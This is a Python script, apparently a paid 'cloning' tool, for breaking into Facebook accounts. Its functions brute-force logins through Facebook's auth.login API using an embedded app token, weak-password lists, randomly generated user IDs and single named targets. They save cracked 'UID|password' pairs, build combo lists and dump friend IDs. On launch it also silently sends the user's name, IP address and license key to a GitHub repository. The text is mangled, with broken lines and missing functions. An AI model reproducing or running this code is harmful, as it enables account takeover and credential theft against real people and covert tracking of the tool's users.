#!/usr/bin/env python3

-- coding: utf-8 --

import os import sys import time import uuid import json import requests import base64 import random import threading from datetime import datetime from rich.console import Console from rich.table import Table from rich.panel import Panel from rich.prompt import Prompt from rich.progress import Progress

console = Console()

GitHub Raw Key File & Logs Config

APPROVED_KEYS_URL = "https://raw.githubusercontent.com/Labbaik757/Labbaik-Official/main/keys/approved_keys.txt" LOG_UPLOAD_REPO = "Labbaik757/labbaik-logs" LOG_UPLOAD_PATH = "logs.txt" GITHUB_TOKEN = "ghp_xxxREPLACEMExxx"  # Replace with your actual token

Banner

BANNER = """ ███████╗ █████╗ ███████╗███████╗ ██╔════╝██╔══██╗╚══███╔╝██╔════╝ █████╗  ███████║  ███╔╝ █████╗
██╔══╝  ██╔══██║ ███╔╝  ██╔══╝
██║     ██║  ██║███████╗███████╗ ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ MAAZ TOOL """

def show_banner(): console.print(Panel(BANNER, style="bold cyan"))

def fetch_approved_keys(): try: response = requests.get(APPROVED_KEYS_URL) if response.status_code == 200: return response.text.splitlines() return [] except: return []

def is_key_valid(user_key): approved_keys = fetch_approved_keys() for line in approved_keys: if line.strip() == user_key.strip(): return True return False

def upload_log(username, key): try: now = datetime.now().strftime("%Y-%m-%d %H:%M:%S") ip = requests.get("https://api.ipify.org").text.strip() log_line = f"[{now}] USERNAME: {username} | IP: {ip} | KEY: {key}\n"

url = f"https://api.github.com/repos/{LOG_UPLOAD_REPO}/contents/{LOG_UPLOAD_PATH}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }

    res = requests.get(url, headers=headers)
    if res.status_code == 200:
        sha = res.json()['sha']
        old_content = requests.get(res.json()['download_url']).text
        updated_content = old_content + log_line
    else:
        sha = None
        updated_content = log_line

    encoded = base64.b64encode(updated_content.encode()).decode()

    data = {
        "message": "Update logs.txt",
        "content": encoded,
        "branch": "main"
    }
    if sha:
        data["sha"] = sha

    requests.put(url, headers=headers, json=data)
except:
    pass

def fb_login(uid, pwd, ok_file, cp_file): headers = { "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36", } data = { "email": uid, "pass": pwd, "login_source": "comet_log_in", "fb_api_req_friendly_name": "authenticate", "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "format": "JSON", "sdk_version": "2", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6" } try: res = requests.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers).json() if "session_key" in res and "EAAA" in res.get("access_token", ""): console.print(f"[bold green][OK][/bold green] {uid}|{pwd}") ok_file.write(f"{uid}|{pwd}\n") elif "error_msg" in res and "www.facebook.com" in res["error_msg"]: console.print(f"[bold yellow][CP][/bold yellow] {uid}|{pwd}") cp_file.write(f"{uid}|{pwd}\n") except: pass

def brute_uid_clone(): os.system('clear' if os.name == 'posix' else 'cls') show_banner() limit = int(Prompt.ask("[bold cyan]🔁 Enter limit of UIDs to generate (e.g. 5000)[/bold cyan]")) console.print("\n[bold cyan]🔄 Generating random UIDs and applying global passwords...[/bold cyan]") uid_prefixes = ["100000", "100001", "100002", "100003", "100004"] uids = [random.choice(uid_prefixes) + str(random.randint(1111111, 9999999)) for _ in range(limit)] ok_file = open("OK.txt", "a") cp_file = open("CP.txt", "a")

def attempt(uid):
    pwds = [
        "123456",
        "1234567",
        "12345678",
        "123456789",
        "1234567890",
        "786786",
        "112233",
        "000000",
        "password",
        "iloveyou",
        "qwerty",
        "letmein",
        "facebook",
        "123123",
        "welcome",
        "pass123",
        "admin",
    ]
    for pwd in pwds:
        fb_login(uid, pwd, ok_file, cp_file)

threads = []
with Progress() as progress:
    task = progress.add_task("[green]Cloning...", total=limit)
    for uid in uids:
        t = threading.Thread(target=attempt, args=(uid,))
        t.start()
        threads.append(t)
        progress.update(task, advance=1)
    for t in threads:
        t.join()

ok_file.close()
cp_file.close()
console.print("\n[bold green]✅ RANDOM METHOD completed. Results saved in OK.txt and CP.txt[/bold green]")
input("\n[bold yellow]Press Enter to return to menu...[/bold yellow]")
dashboard("User", "LOCAL")

def developer_bruteforce(): os.system('clear' if os.name == 'posix' else 'cls') show_banner() console.print("[bold red]🛠 Developer-Only: BruteForce on Single Target[/bold red] ")

target = Prompt.ask("[cyan]🔐 Enter UID or Email of target[/cyan]")
if not os.path.exists("wordlist.txt"):
    console.print("[yellow]⚙️ No wordlist found. Generating default wordlist.txt...[/yellow]")
    default_words = [
        "123456", "12345678", "786786", "112233", "000000",
        "password", "iloveyou", "qwerty", "facebook",
        "123123", "welcome", "admin123", "pakistan786",
        "pass123", "letmein", "love123", "login123"
    ]
    with open("wordlist.txt", "w") as f:
        for word in default_words:
            f.write(word + "

")

passwords = open("wordlist.txt").read().splitlines()
console.print(f"

[bold cyan]🚀 Trying {len(passwords)} passwords on target: [yellow]{target}[/yellow][/bold cyan] ")

ok_file = open("OK.txt", "a")
cp_file = open("CP.txt", "a")

def fb_login(uid, pwd):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/89.0.4389.90 Mobile Safari/537.36",
    }
    data = {
        "email": uid,
        "pass": pwd,
        "login_source": "comet_log_in",
        "fb_api_req_friendly_name": "authenticate",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "format": "JSON",
        "sdk_version": "2",
        "generate_session_cookies": "1",
        "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"
    }
    try:
        res = requests.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers).json()
        if "session_key" in res and "EAAA" in res.get("access_token", ""):
            console.print(f"[bold green][OK][/bold green] {uid}|{pwd}")
            ok_file.write(f"{uid}|{pwd}

") elif "error_msg" in res and "www.facebook.com" in res["error_msg"]: console.print(f"[bold yellow][CP][/bold yellow] {uid}|{pwd}") cp_file.write(f"{uid}|{pwd} ") except: pass

for pwd in passwords:
    fb_login(target, pwd)

ok_file.close()
cp_file.close()
console.print("

[bold green]✅ BruteForce Complete! Results in OK.txt / CP.txt[/bold green]") input(" [bold yellow]Press Enter to return to dashboard...[/bold yellow]") dashboard("Developer", "Local")

def combo_generator(): os.system('clear' if os.name == 'posix' else 'cls') show_banner() limit = int(Prompt.ask("[bold cyan]🔁 How many combos to generate? (e.g. 5000)[/bold cyan]")) console.print(" [bold cyan]🧠 Generating UID|PASSWORD combos with common weak passwords...[/bold cyan]")

uid_prefixes = ["100000", "100001", "100002", "100003", "100004"]
passwords = [
    "123456", "1234567", "12345678", "123456789", "1234567890",
    "786786", "112233", "000000",
    "password", "iloveyou", "qwerty", "letmein",
    "facebook", "123123", "welcome", "pass123", "admin"
]

with open("combo.txt", "a") as file:
    with Progress() as progress:
        task = progress.add_task("[green]Generating...", total=limit)
        for _ in range(limit):
            uid = random.choice(uid_prefixes) + str(random.randint(1111111, 9999999))
            pwd = random.choice(passwords)
            file.write(f"{uid}|{pwd}

") progress.update(task, advance=1)

console.print("

[bold green]✅ combo.txt generated successfully! You can now run OLD METHOD to use it.[/bold green]") input(" [bold yellow]Press Enter to return to menu...[/bold yellow]") dashboard("User", "LOCAL")

def uid_dump(): os.system('clear' if os.name == 'posix' else 'cls') show_banner() console.print("[bold cyan]🔍 Enter Facebook public profile ID to dump UIDs[/bold cyan]") public_id = Prompt.ask("[green]📥 Enter Public Profile ID[/green]")

try:
    dump_limit = int(Prompt.ask("[cyan]🔢 How many UIDs to dump? (e.g. 1000)[/cyan]"))
    token = Prompt.ask("[yellow]🔑 Enter valid Facebook access token[/yellow]")
    url = f"https://graph.facebook.com/{public_id}/friends?limit={dump_limit}&access_token={token}"
    r = requests.get(url)
    if r.status_code != 200 or 'data' not in r.json():
        raise Exception("Invalid ID or token. Dump failed.")

    friends = r.json().get("data", [])
    with open("dump.txt", "w") as f:
        for friend in friends:
            uid = friend.get("id")
            name = friend.get("name")
            if uid:
                f.write(f"{uid}|{name}

")

console.print(f"

[bold green]✅ Successfully dumped {len(friends)} UIDs to dump.txt[/bold green]") except Exception as e: console.print(f"[bold red]❌ Error:[/bold red] {str(e)}")

input("

[bold yellow]Press Enter to return to menu...[/bold yellow]") dashboard("User", "LOCAL")

def dashboard(username, key): os.system('clear' if os.name == 'posix' else 'cls') show_banner() console.print(f"[bold green]🧑 User:[/bold green] [yellow]{username}[/yellow]") console.print(f"[bold green]🔐 Your Key:[/bold green] [yellow]{key}[/yellow]") console.print("\n[bold magenta]Choose Cloning Method:[/bold magenta]\n")

table = Table(show_header=True, header_style="bold blue")
table.add_column("Option")
table.add_column("Method")
table.add_row("1", "OLD METHOD")
table.add_row("2", "SERIES METHOD")
table.add_row("3", "BRUTE UID CLONE")
table.add_row("4", "COMBO GENERATOR")
table.add_row("5", "UID DUMP")
table.add_row("0", "Exit")
console.print(table)

opt = Prompt.ask("

[bold yellow]📌 Choose option[/bold yellow]", default="0") if opt == "dev-brute": developer_bruteforce() elif opt == "0": sys.exit() elif opt == "1": old_method() elif opt == "2": series_method() elif opt == "3": brute_uid_clone() elif opt == "4": combo_generator() elif opt == "5": uid_dump() else: os.system(f"python clone_module.py {opt}")

def check_dependencies(): import importlib from pathlib import Path

console.print("[bold cyan]🧩 Checking dependencies...[/bold cyan]")

# Required files
required_files = ["combo.txt", "dump.txt", "OK.txt", "CP.txt", "wordlist.txt"]
for file in required_files:
    if not Path(file).is_file():
        with open(file, "w") as f:
            if file == "wordlist.txt":
                default_pwds = [
                    "123456", "12345678", "786786", "112233",
                    "password", "iloveyou", "facebook", "admin123",
                    "pakistan786", "pass123", "welcome"
                ]
                for pwd in default_pwds:
                    f.write(pwd + "

") console.print(f"[green]✔ Created:[/green] {file}")

# Required Python modules
required_modules = ["requests", "tqdm", "pycurl", "lolcat", "rich"]
for module in required_modules:
    try:
        importlib.import_module(module)
    except ImportError:
        os.system(f"pip install {module} > /dev/null 2>&1")
        console.print(f"[yellow]🔧 Installed missing module:[/yellow] {module}")

def main(): check_dependencies() os.system('clear' if os.name == 'posix' else 'cls') show_banner() console.print("[bold green]🔑 Enter your license key to continue...[/bold green]") user_key = Prompt.ask("[cyan]🔐 Enter License Key[/cyan]")

if is_key_valid(user_key):
    username = os.getenv("USERNAME") or os.getenv("USER") or "User"
    upload_log(username, user_key)
    dashboard(username, user_key)
else:
    console.print("[bold red]❌ Invalid or unapproved key! Contact admin.[/bold red]")
    console.print("\n[bold yellow]📞 Contact:[/bold yellow] WhatsApp +923079741690 or Telegram @LabbaikSupport")
    sys.exit()

if name == "main": main()

